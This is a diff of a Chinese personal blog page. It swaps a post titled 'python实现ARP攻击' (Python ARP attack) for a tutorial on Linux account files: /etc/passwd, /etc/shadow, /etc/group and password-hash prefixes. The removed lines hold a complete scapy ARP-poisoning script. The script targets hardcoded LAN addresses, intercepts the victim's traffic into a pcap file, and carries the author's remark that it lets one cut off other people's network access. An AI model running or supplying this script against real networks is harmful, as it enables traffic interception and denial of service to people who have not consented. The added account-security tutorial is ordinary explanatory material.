@@ -112,19 +112,21 @@
 
 
 
-  <meta name="description" content="from scapy.all import * import os import sys import threading import signal  interface = &amp;apos;Realtek PCIe GBE Family Controller&amp;apos; target_ip=&amp;apos;10.60.17.12&amp;apos; gateway_ip=&amp;apos;10.60.17.1&amp;ap">
+  <meta name="description" content="Linux系统标识与鉴别-安全主体安全主体 用户：身份标识（UserID） 组：身份标识（Group ID）  用户与组基本概念 文件必须有所有者 用户必须属于某个或多个组 用户与组的关系灵活（一对多、多对多等都可以） 根用户拥有所有权限  Linux系统标识与鉴别-帐号信息存储信息存储用户信息/etc/passwd /etc/shadow 组信息/etc/group /etc/gshadow 在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python实现ARP攻击">
-<meta property="og:url" content="http://yoursite.com/2018/12/03/python实现ARP攻击/index.html">
+<meta property="og:title" content="Linux账户安全机制">
+<meta property="og:url" content="http://yoursite.com/2018/12/13/Linux账户安全机制/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="from scapy.all import * import os import sys import threading import signal  interface = &amp;apos;Realtek PCIe GBE Family Controller&amp;apos; target_ip=&amp;apos;10.60.17.12&amp;apos; gateway_ip=&amp;apos;10.60.17.1&amp;ap">
+<meta property="og:description" content="Linux系统标识与鉴别-安全主体安全主体 用户：身份标识（UserID） 组：身份标识（Group ID）  用户与组基本概念 文件必须有所有者 用户必须属于某个或多个组 用户与组的关系灵活（一对多、多对多等都可以） 根用户拥有所有权限  Linux系统标识与鉴别-帐号信息存储信息存储用户信息/etc/passwd /etc/shadow 组信息/etc/group /etc/gshadow 在">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmiyon6cj30in06uwer.jpg">
-<meta property="og:updated_time" content="2018-12-03T08:12:31.113Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20181107211116303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20181107211643794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20181107212302747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2018-12-13T02:57:53.857Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python实现ARP攻击">
-<meta name="twitter:description" content="from scapy.all import * import os import sys import threading import signal  interface = &amp;apos;Realtek PCIe GBE Family Controller&amp;apos; target_ip=&amp;apos;10.60.17.12&amp;apos; gateway_ip=&amp;apos;10.60.17.1&amp;ap">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmiyon6cj30in06uwer.jpg">
+<meta name="twitter:title" content="Linux账户安全机制">
+<meta name="twitter:description" content="Linux系统标识与鉴别-安全主体安全主体 用户：身份标识（UserID） 组：身份标识（Group ID）  用户与组基本概念 文件必须有所有者 用户必须属于某个或多个组 用户与组的关系灵活（一对多、多对多等都可以） 根用户拥有所有权限  Linux系统标识与鉴别-帐号信息存储信息存储用户信息/etc/passwd /etc/shadow 组信息/etc/group /etc/gshadow 在">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20181107211116303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70">
 
 
 
@@ -133,7 +135,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/03/python实现ARP攻击/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/13/Linux账户安全机制/">
 
 
 
@@ -143,7 +145,7 @@
   };
 </script>
 
-  <title>python实现ARP攻击 | guolala's blog</title>
+  <title>Linux账户安全机制 | guolala's blog</title>
   
 
 
@@ -356,7 +358,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/python实现ARP攻击/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/13/Linux账户安全机制/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="guolala">
@@ -373,7 +375,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">python实现ARP攻击
+          <h1 class="post-title" itemprop="name headline">Linux账户安全机制
               
             
           </h1>
@@ -398,7 +400,7 @@
                 
               
 
-              <time title="创建时间：2018-12-03 16:05:10 / 修改时间：16:12:31" itemprop="dateCreated datePublished" datetime="2018-12-03T16:05:10+08:00">2018-12-03</time>
+              <time title="创建时间：2018-12-13 10:43:18 / 修改时间：10:57:53" itemprop="dateCreated datePublished" datetime="2018-12-13T10:43:18+08:00">2018-12-13</time>
             
 
             
@@ -420,7 +422,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/python脚本/" itemprop="url" rel="index"><span itemprop="name">python脚本</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a></span>
 
                 
                 
@@ -461,90 +463,56 @@
       
 
       
-        <pre><code>from scapy.all import *
-import os
-import sys
-import threading
-import signal
-
-interface = &apos;Realtek PCIe GBE Family Controller&apos;
-target_ip=&apos;10.60.17.12&apos;
-gateway_ip=&apos;10.60.17.1&apos;
-packet_count=1000
-
-#设置嗅探的网卡
-conf.iface=interface
-#关闭输出
-conf.verb = 0
-print(&apos;[*]Setting up&apos;+interface)
-
-def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    print(&apos;[*]Restoring target.....&apos;)
-    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5)
-    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5)
-    #发送退出信号到主线程
-    os.kill(os.getpid(),signal.SIGINT)
-def get_mac(ip_address):
-    responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10)
-    for s, r in responses:
-        return r[Ether].src
-    return None
-
-def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    poison_target = ARP()
-    poison_target.op = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
-    poison_target.hwdst = target_mac
-    poison_gateway = ARP()
-    poison_gateway.op = 2
-    poison_gateway.psrc = target_ip
-    poison_gateway.pdst = gateway_ip
-    poison_gateway.hwdst = gateway_mac
-    print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;)
-    while True:
-        try:
-            send(poison_target)
-            send(poison_gateway)
-            time.sleep(2)
-        except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-
-    print(&quot;[*] ARP poison attack finished.&quot;)
-    return
-
-
-gateway_mac = get_mac(gateway_ip)
-if gateway_mac is None:
-    print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;)
-    sys.exit(0)
-else:
-    print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac))
-
-target_mac = get_mac(target_ip)
-if target_mac is None:
-    print(&apos;[!!!]Faile to get target MAC. Exiting&apos;)
-    sys.exit(0)
-else:
-    print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac))
-
-#开启ARP攻击线程
-poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
-poison_thread.start()
-
-try:
-    print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count)
-    bpf_filter = &apos;ip host %s&apos;%target_ip
-    packes = sniff(count=packet_count,filter=bpf_filter,iface=interface)
-    #将捕获到的数据包传输到文件
-    wrpcap(&apos;arper.pcap&apos;,packes)
-    #还原网络配置
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-except  KeyboardInterrupt:
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-    sys.exit(0)
-</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmiyon6cj30in06uwer.jpg" alt=""></p>
-<p>好了，现在可以断别人网了….</p>
+        <h1 id="Linux系统标识与鉴别-安全主体"><a href="#Linux系统标识与鉴别-安全主体" class="headerlink" title="Linux系统标识与鉴别-安全主体"></a>Linux系统标识与鉴别-安全主体</h1><h2 id="安全主体"><a href="#安全主体" class="headerlink" title="安全主体"></a>安全主体</h2><ul>
+<li>用户：身份标识（UserID）</li>
+<li>组：身份标识（Group ID）</li>
+</ul>
+<h2 id="用户与组基本概念"><a href="#用户与组基本概念" class="headerlink" title="用户与组基本概念"></a>用户与组基本概念</h2><ul>
+<li>文件必须有所有者</li>
+<li>用户必须属于某个或多个组</li>
+<li>用户与组的关系灵活（一对多、多对多等都可以）</li>
+<li>根用户拥有所有权限</li>
+</ul>
+<h1 id="Linux系统标识与鉴别-帐号信息存储"><a href="#Linux系统标识与鉴别-帐号信息存储" class="headerlink" title="Linux系统标识与鉴别-帐号信息存储"></a>Linux系统标识与鉴别-帐号信息存储</h1><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><pre><code>/etc/passwd
+/etc/shadow
+</code></pre><h3 id="组信息"><a href="#组信息" class="headerlink" title="组信息"></a>组信息</h3><pre><code>/etc/group
+/etc/gshadow
+</code></pre><p>在Linux中系统中，并不认识<strong>帐号名称</strong>，认识的是<strong>帐号ID</strong>，帐号ID保存在<code>/etc/passwd</code>文件中</p>
+<p>在登录Linux主机时，在输入完帐号和密码时，Linux会先查找<code>/etc/passwd</code>文件中是否有这个帐号，如果没有则跳出，如果有的话，他会读取该帐号的user ID和group ID同时该帐号的根目录和shell也读了出来</p>
+<h3 id="etc-passwd中的信息"><a href="#etc-passwd中的信息" class="headerlink" title="/etc/passwd中的信息"></a><code>/etc/passwd</code>中的信息</h3><p><img src="https://img-blog.csdnimg.cn/20181107211116303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>一共有七项，每一项使用：分开，他们代表的意思如下：</p>
+<p>（1）帐号名称：帐号名称由于对应用户ID，这个是系统默认用户root超级管理员，在同一个系统帐号名称是唯一的。</p>
+<p>（2）密码：由于系统中/etc/shadow文件用于存放加密后的口令，所以在这里这一项是“x”来表示，如果用户没有设置口令，则该项为空。</p>
+<p>（3）用户lD：不同的用户识别码不同，其中用户ID有以下几种：<br>0代表系统管理员（如果建立一个系统管理员，可以建立一个普通帐户，然后将该账户的用户1D改为0即可）。<br>1-500系统预留的1D，500以上是普通用户使用。</p>
+<p>（4）组ID：用来规范群组，他与<code>/etc/group</code>有关。</p>
+<p>（5）描述信息：这个字段几乎没有什么作用，只是用来解释这个帐号的意义。</p>
+<p>（6）用户根目录：就是用户登录系统的起始目录，用户登录系统后将首先进入该目录。root用户默认的是<code>/root</code>，普通用户的是<code>/home</code>/用户名。</p>
+<p>（7）用户登录shell：就是用户登录系统时使用的shell。</p>
+<h3 id="etc-shadow中的信息"><a href="#etc-shadow中的信息" class="headerlink" title="/etc/shadow中的信息"></a><code>/etc/shadow</code>中的信息</h3><p><img src="https://img-blog.csdnimg.cn/20181107211643794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p>
+<ul>
+<li>由于passwd文件对于系统中的所有用户是可读的，口令比较容易破解，存在较大的安全隐患。</li>
+<li>使用“shadow”文件保存密文的用户口令，“shadow”文件只有管理员用户才可以读取其中的内容。</li>
+</ul>
+<p><strong>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志</strong></p>
+<p>（1）帐户名称：和passwd对应，和passwd的意思相同。</p>
+<p>（2）密码：已经加密过的真正的密码，只能看到一些特殊符号。<br><strong>如第一个字符为<code>“*”</code>表示此用户不用来登录，如不想让某账户登录可在前面加个星。</strong></p>
+<ul>
+<li>$1$表明是用MD5加密的</li>
+<li>$2$是用Blowfish加密的</li>
+<li>$5$是用SHA-256加密的</li>
+<li>$6$开头的，表明是用SHA-512加密的，</li>
+</ul>
+<p>（3）上次改动密码的日期：这段记录了改动密码的最后日期。因为Linux计算日期的方法是以1970年1月1日作为1，1971年1月1日就是366，依次类推</p>
+<p>（4）密码不可被改动的天数：必须在这个时间内重新修改密码，否则这个帐号将暂时失效。上面的99999，表示密码不需要重新输入</p>
+<p>（5）密码变更期期限快到前的警告期：当帐号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户：再过n天您的密码将过期，请尽快重新设定密码。默认的是七天。</p>
+<p>（6）帐号失效期</p>
+<p>（7）帐号取消日期</p>
+<p>（8）保留：最后一个字段是保留的，看以后有没有新功能加入。</p>
+<h3 id="etc-group中的信息"><a href="#etc-group中的信息" class="headerlink" title="/etc/group中的信息"></a><code>/etc/group</code>中的信息</h3><p><img src="https://img-blog.csdnimg.cn/20181107212302747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>（1）群组名称：就是群组的名称了。</p>
+<p>（2）群组密码：通常不需设定，很少使用群组登录。密码被记录在<code>/etc/gshadow</code>中。</p>
+<p>（3）群组ID：也就是组ID了。</p>
+<p>（4）支持帐号的名称：这个群组的所有帐号</p>
 
       
     </div>
@@ -575,8 +543,8 @@ except  KeyboardInterrupt:
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/03/基于流量分析的SQL注入检测/" rel="next" title="基于流量分析的SQL注入检测">
-                <i class="fa fa-chevron-left"></i> 基于流量分析的SQL注入检测
+              <a href="/2018/12/12/利用airodump-ng和aircrack-ng进行无线破解/" rel="next" title="利用airodump-ng和aircrack-ng进行无线破解">
+                <i class="fa fa-chevron-left"></i> 利用airodump-ng和aircrack-ng进行无线破解
               </a>
             
           </div>
@@ -584,10 +552,6 @@ except  KeyboardInterrupt:
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/03/比二分法更OK的盲注多线程/" rel="prev" title="比二分法更OK的盲注多线程">
-                比二分法更OK的盲注多线程 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -632,8 +596,17 @@ except  KeyboardInterrupt:
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -748,6 +721,22 @@ except  KeyboardInterrupt:
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux系统标识与鉴别-安全主体"><span class="nav-number">1.</span> <span class="nav-text">Linux系统标识与鉴别-安全主体</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安全主体"><span class="nav-number">1.1.</span> <span class="nav-text">安全主体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户与组基本概念"><span class="nav-number">1.2.</span> <span class="nav-text">用户与组基本概念</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux系统标识与鉴别-帐号信息存储"><span class="nav-number">2.</span> <span class="nav-text">Linux系统标识与鉴别-帐号信息存储</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息存储"><span class="nav-number">2.1.</span> <span class="nav-text">信息存储</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用户信息"><span class="nav-number">2.1.1.</span> <span class="nav-text">用户信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#组信息"><span class="nav-number">2.1.2.</span> <span class="nav-text">组信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#etc-passwd中的信息"><span class="nav-number">2.1.3.</span> <span class="nav-text">/etc/passwd中的信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#etc-shadow中的信息"><span class="nav-number">2.1.4.</span> <span class="nav-text">/etc/shadow中的信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#etc-group中的信息"><span class="nav-number">2.1.5.</span> <span class="nav-text">/etc/group中的信息</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
